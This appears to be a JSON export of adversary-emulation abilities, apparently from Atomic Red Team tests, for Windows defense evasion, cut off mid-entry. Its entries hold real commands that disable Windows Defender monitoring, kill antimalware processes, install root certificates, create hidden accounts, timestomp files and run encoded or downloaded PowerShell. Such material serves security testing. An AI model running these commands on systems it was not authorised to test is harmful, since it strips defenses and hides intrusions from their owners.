    "8726ca5187dbcd44ee2eed8c0fa879d7": {
        "description": "Executes an HTA Application using JScript script engine simulating double click.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.005",
            "name": "Signed Binary Proxy Execution: Mshta"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8726ca5187dbcd44ee2eed8c0fa879d7",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e411af97e02c9f711883f20f89c7daed": {
        "description": "Adversaries may supply CMSTP.exe with INF files infected with malicious commands\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.003",
            "name": "Signed Binary Proxy Execution: CMSTP"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "cmstp.exe /s 0deff5_T1218.003.inf",
                    "payloads": [
                        "0deff5_T1218.003.inf"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "e411af97e02c9f711883f20f89c7daed",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "dedfa0a54c9c13ce5714a0dc2e1f5d1a": {
        "description": "Creating a user with a username containing \"$\"",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564",
            "name": "Hide Artifacts"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "net user $ /DELETE 2>&1",
                    "command": "net user $ ATOMIC123! /add /active:yes",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "dedfa0a54c9c13ce5714a0dc2e1f5d1a",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "799defcee616a1e38cd043c55560feca": {
        "description": "Mounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. \nUpon successful execution, powershell will download the .iso from the Atomic Red Team repo, mount the image, and run the executable from the ISO image that will open command prompt echoing \"Hello, World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,  ",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1553.005",
            "name": "Subvert Trust Controls: Mark-of-the-Web Bypass"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Dismount-DiskImage -ImagePath \"0f959a_FeelTheBurn.iso\" | Out-Null; Stop-process -name \"hello\" -Force -ErrorAction ignore",
                    "command": "$keep = Mount-DiskImage -ImagePath \"0f959a_FeelTheBurn.iso\" -StorageType ISO -Access ReadOnly; $driveLetter = ($keep | Get-Volume).DriveLetter; invoke-item \"$($driveLetter):\\hello.exe\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "0f959a_FeelTheBurn.iso",
                        "0f959a_FeelTheBurn.iso"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "799defcee616a1e38cd043c55560feca",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "28862487a99f5f89bc0d68c87396c7e9": {
        "description": "Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run \"dir /a-d /s /r | find \":$DATA\"\" in the %temp%\nfolder to view that the alternate data stream exists. To view the data in the alternate data stream, run \"notepad T1564.004_has_ads.txt:adstest.txt\"\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564.004",
            "name": "Hide Artifacts: NTFS File Attributes"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %temp%\\T1564.004_has_ads_cmd.txt >nul 2>&1",
                    "command": "echo cmd /c echo \"Shell code execution.\"> %temp%\\T1564.004_has_ads_cmd.txt:adstest.txt && for /f \"usebackq delims=?\" %i in (%temp%\\T1564.004_has_ads_cmd.txt:adstest.txt) do %i",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "28862487a99f5f89bc0d68c87396c7e9",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "6f41530a95dd7c36bd8549b534b1c4c5": {
        "description": "Timestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.006",
            "name": "Indicator Removal on Host: Timestomp"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:appdata\\Microsoft\\timestomp.ps1 -ErrorAction Ignore; Remove-Item $env:appdata\\Microsoft\\kxwn.lock -ErrorAction Ignore",
                    "command": "import-module $env:appdata\\Microsoft\\timestomp.ps1; timestomp -dest \"$env:appdata\\Microsoft\\kxwn.lock\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6f41530a95dd7c36bd8549b534b1c4c5",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "355aef8ac8f57f9d407c018439e7285d": {
        "description": "Create a simple VirtualBox VM and start up the machine\nCleanup command stops and deletes the newly created VM and associated files\nhttps://www.virtualbox.org/manual/ch08.html#vboxmanage-startvm\nhttps://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\nhttps://attack.mitre.org/techniques/T1564/006/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564.006",
            "name": "Run Virtual Instance"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" controlvm \"Atomic VM\" poweroff && \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" unregistervm \"Atomic VM\" --delete",
                    "command": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" createvm --name \"Atomic VM\" --register && \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" modifyvm \"Atomic VM\" --firmware efi && \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" startvm \"Atomic VM\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "355aef8ac8f57f9d407c018439e7285d",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "e349fb8d815e4b5ac1473d691a8c8da9": {
        "description": "Modifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.006",
            "name": "Indicator Removal on Host: Timestomp"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-ChildItem $env:TEMP\\T1551.006_timestomp.txt | % { $_.LastWriteTime = \"01/01/1970 00:00:00\" }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e349fb8d815e4b5ac1473d691a8c8da9",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "08611a656fc95c1594bc6efec53da5b1": {
        "description": "Creates a root CA with Powershell\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1553.004",
            "name": "Subvert Trust Controls: Install Root Certificate"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "try {;    $cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\\LocalMachine\\My -ErrorAction Ignore;    Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore;    Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore; }; catch { }",
                    "command": "$cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\\LocalMachine\\My; Move-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "08611a656fc95c1594bc6efec53da5b1",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "c527bd5a0b9a0c0235ae6cc5b947931f": {
        "description": "Executes the installer assembly class constructor. Upon execution, version information will be displayed the .NET framework install utility.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.004",
            "name": "Signed Binary Proxy Execution: InstallUtil"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore",
                    "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "eaecbe_InstallUtilTestHarness.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "c527bd5a0b9a0c0235ae6cc5b947931f",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "bc456ce28da22e33b96257b6ae020391": {
        "description": "It may be suspicious seeing a file copy of an EXE in System32 or SysWOW64 to a non-system directory or executing from a non-system directory.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036",
            "name": "Masquerading"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "remove-item \"$env:allusersprofile\\cmd.exe\" -force -erroraction silentlycontinue",
                    "command": "copy-item \"$env:windir\\System32\\cmd.exe\" -destination \"$env:allusersprofile\\cmd.exe\"; start-process \"$env:allusersprofile\\cmd.exe\"; sleep -s 5 ; stop-process -name \"cmd\" | out-null",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bc456ce28da22e33b96257b6ae020391",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e44e818e80f6761a1fef5d5d6f27b5f5": {
        "description": "Open a .docx file that loads a remote .dotm macro enabled template from https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1221/src/opencalc.dotm \nExecutes the code specified within the .dotm template.\nRequires download of WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.  \nDefault docs file opens Calculator.exe when test sucessfully executed, while AV turned off.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1221",
            "name": "Template Injection"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "start 01b633_Calculator.docx",
                    "payloads": [
                        "01b633_Calculator.docx"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "e44e818e80f6761a1fef5d5d6f27b5f5",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "0bcebac390d0550b00743c741297ddfe": {
        "description": "When the file is unzipped and the README.cmd file opened, it executes and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique [as reported here](https://twitter.com/ffforward/status/1481672378639912960)",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036",
            "name": "Masquerading"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "taskkill /IM Calculator.exe /f >$null 2>$null; Remove-Item $env:userprofile\\Downloads\\T1036 -recurse -ErrorAction Ignore",
                    "command": "if (Test-Path $env:userprofile\\Downloads\\T1036.zip) { ; } else {Invoke-WebRequest -OutFile \"$env:userprofile\\Downloads\\T1036.zip\" https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip};  ;  Expand-Archive -Path $env:userprofile\\Downloads\\T1036.zip -DestinationPath $env:userprofile\\Downloads\\T1036 -Force; cd $env:userprofile\\Downloads\\T1036; cmd /c $env:userprofile\\Downloads\\T1036\\README.cmd >$null 2>$null",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0bcebac390d0550b00743c741297ddfe",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "298c4695374a3e34d171d04301c3b236": {
        "description": "Executes the InstallHelper class constructor runner instead of executing InstallUtil. Upon execution, no output will be displayed if the test\nexecuted successfuly.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.004",
            "name": "Signed Binary Proxy Execution: InstallUtil"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore",
                    "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'InstallHelper';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "eaecbe_InstallUtilTestHarness.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "298c4695374a3e34d171d04301c3b236",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "17bec14a26b2aa94edcbe4e8e8e0c97e": {
        "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.010",
            "name": "Signed Binary Proxy Execution: Regsvr32"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s bafdf3_AllTheThingsx86.dll) ELSE ( C:\\Windows\\system32\\regsvr32.exe /s bafdf3_AllTheThingsx86.dll )",
                    "payloads": [
                        "bafdf3_AllTheThingsx86.dll"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "17bec14a26b2aa94edcbe4e8e8e0c97e",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "08dccf0eca884f90e2fc52757a53a4a7": {
        "description": "This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218",
            "name": "Signed Binary Proxy Execution"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "taskkill /f /im calculator.exe > nul 2>&1",
                    "command": "wuauclt.exe /UpdateDeploymentProvider 6349c0_calc.dll /RunHandlerComServer",
                    "payloads": [
                        "6349c0_calc.dll"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "08dccf0eca884f90e2fc52757a53a4a7",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "e30d392a79640eb86ee5fedd78416a33": {
        "description": "IcedID uses this TTP as follows:\n  rundll32.exe url.dll,OpenURL %PUBLIC%\\index.hta\nTrickbot uses this TTP as follows:\n  rundll32.exe URL.dll,FileProtocolHandler C:\\\\..\\\\Detail\\\\akteullen.vbs\n\nIn this atomic, the sample hta file opens the calculator and the vbs file shows a message dialog with \"rundll32 spawned wscript\"\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.011",
            "name": "Signed Binary Proxy Execution: Rundll32"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "rundll32.exe url.dll,OpenURL 631d9f_index.hta && rundll32.exe URL.dll,FileProtocolHandler PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs",
                    "payloads": [
                        "631d9f_index.hta"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "e30d392a79640eb86ee5fedd78416a33",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "6a4f5aca52680eef33a8285782936333": {
        "description": "Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.\nhttps://github.com/Yaxser/Backstab",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "& $env:temp\\Backstab64.exe -k -n MsMpEng.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6a4f5aca52680eef33a8285782936333",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "df33cda361afedfcca27c84ed89d169a": {
        "description": "Removes a Network Share utilizing the command_prompt\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.005",
            "name": "Indicator Removal on Host: Network Share Connection Removal"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "net share \\\\test\\share /delete",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "df33cda361afedfcca27c84ed89d169a",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "3df459a1c6e933bc2afec5cfd0370699": {
        "description": "Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute encoded command and read/write from the registry.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1027",
            "name": "Obfuscated Files or Information"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Force -ErrorAction Ignore -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name Debug",
                    "command": "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); $EncodedCommand =[Convert]::ToBase64String($Bytes); $EncodedCommand; Set-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name Debug -Value $EncodedCommand; powershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion Debug).Debug)))\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3df459a1c6e933bc2afec5cfd0370699",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ed172018f897dab90147a47995ce197d": {
        "description": "This is an obfuscated PowerShell command which when executed prints \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1027",
            "name": "Obfuscated Files or Information"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$cmDwhy =[TyPe](\"{0}{1}\" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](\"{1}{0}{2}\"-f'nv','cO','ert')  ;  &(\"{0}{2}{3}{1}{4}\" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(\"{1}{2}{0}\"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).\"v`ALUe\"::(\"{1}{0}\" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::\"t`OinT`16\"(( [sTring]${_}) ,8)))})) )",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ed172018f897dab90147a47995ce197d",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "aa4c0ef131be308c9fb61782afe15a45": {
        "description": "Executes a CHM file using the Shortcut Command method with a defined ITS Protocol Handler, and help topic extension.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.001",
            "name": "Signed Binary Proxy Execution: Compiled HTML File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "aa4c0ef131be308c9fb61782afe15a45",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "0a3255d3b22be6956f25f00e90c7467e": {
        "description": "Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.007",
            "name": "Signed Binary Proxy Execution: Msiexec"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "#{msi_exe} /q /i \"#{msi_payload}\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0a3255d3b22be6956f25f00e90c7467e",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "07ccf6feceb31dbfe88602a05f00d8c2": {
        "description": "Creates a root CA with certutil\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1553.004",
            "name": "Subvert Trust Controls: Install Root Certificate"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "try {; $cert = Import-Certificate -FilePath $env:Temp\\rootCA2.cer -CertStoreLocation Cert:\\LocalMachine\\My; Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore; Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore; } catch { }",
                    "command": "certutil -addstore my $env:Temp\\rootCA2.cer",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "07ccf6feceb31dbfe88602a05f00d8c2",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ed3b15750348bb19147cc63c9fcb46db": {
        "description": "Add a Network Share utilizing the command_prompt\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.005",
            "name": "Indicator Removal on Host: Network Share Connection Removal"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "net use c: \\\\test\\share && net share test=\\\\test\\share /REMARK:\"test share\" /CACHE:No",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ed3b15750348bb19147cc63c9fcb46db",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "ed335269c049080700b57add9ba733fb": {
        "description": "Create a simple Hyper-V VM (Windows native hypervisor) and start up the machine\nCleanup command stops and deletes the newly created VM\nhttps://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v\nhttps://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/\nhttps://attack.mitre.org/techniques/T1564/006/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564.006",
            "name": "Run Virtual Instance"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-VM $VM -Force; Remove-VM $VM -Force",
                    "command": "if ((Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V) { ; } else {Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All -Force};  ;  $VM = \"Atomic VM\"; New-VM -Name $VM -Generation 2; Set-VMFirmware $VM -EnableSecureBoot Off; Start-VM $VM",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ed335269c049080700b57add9ba733fb",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "7e7d99ed94703f604f05ad8682dbb159": {
        "description": "Executes an MSI containing embedded VBScript code using the WMI Win32_Product class\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.007",
            "name": "Signed Binary Proxy Execution: Msiexec"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7e7d99ed94703f604f05ad8682dbb159",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f0fde90a3d59061b226197974e7dcbaa": {
        "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-MpPreference -DisableRealtimeMonitoring 0; Set-MpPreference -DisableBehaviorMonitoring 0; Set-MpPreference -DisableScriptScanning 0; Set-MpPreference -DisableBlockAtFirstSeen 0",
                    "command": "Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -DisableScriptScanning 1; Set-MpPreference -DisableBlockAtFirstSeen 1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f0fde90a3d59061b226197974e7dcbaa",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "9a2edad4053a2b59fb9167a9bc29e7dc": {
